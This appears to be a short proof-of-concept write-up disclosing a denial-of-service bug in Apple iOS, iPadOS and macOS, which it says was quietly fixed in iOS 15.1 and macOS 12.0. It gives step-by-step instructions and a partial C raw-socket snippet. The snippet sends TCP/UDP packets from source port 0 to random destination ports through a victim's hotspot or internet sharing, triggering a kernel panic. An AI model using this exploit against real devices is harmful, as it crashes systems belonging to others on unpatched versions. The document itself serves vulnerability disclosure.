# PoC for iOS, macOS, iPadOS (DoS)

**Update: Apple has quietly fixed this in iOS(and iPadOS) 15.1 and macOS 12.0 without any kind of public acknowledgement or reward.**

## Issue
Kernel panic after send 2+ TCP/UDP packets by attacker device via apple device hotspot net to external network

## Steps
### iPhone, iPad
1) Switch into hotspot mode
2) Attacker connect to iPhone network
3) Attacker send 2+ TCP/UDP packet from source port 0 to different destination ports in external network.
4) Kernel panic
### iMac, Mac, MacBook
0) Require internet access on device
1) On "Internet sharing" (on Bluetooth PAN) on victim apple device
2) Bluetooth pair attacker and victim apple device
3) Attacker connect to internet via apple device
4) Attacket send 2+ TCP/UDP packet from source port 0 to different destination ports in external network.
5) Kernel panic



## Here is a short proof of concept.
We used raw sockets to form a custom package and send requests from port 0.

```с
...
    tcph->source = htons (0); //here we specify the output port 0
...
    while (1)
    {
        tcph->dest = htons (rand()); //here we specify the input port random
        if (sendto (s, datagram, iph->tot_len ,    0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        else
        {
            printf ("Packet Send. Length : %d \n" , iph->tot_len);
        }
        sleep(1);
    }
...
```
After sending 2 packets(print "Packet Send..."), DoS is called and elf execution can be terminated.
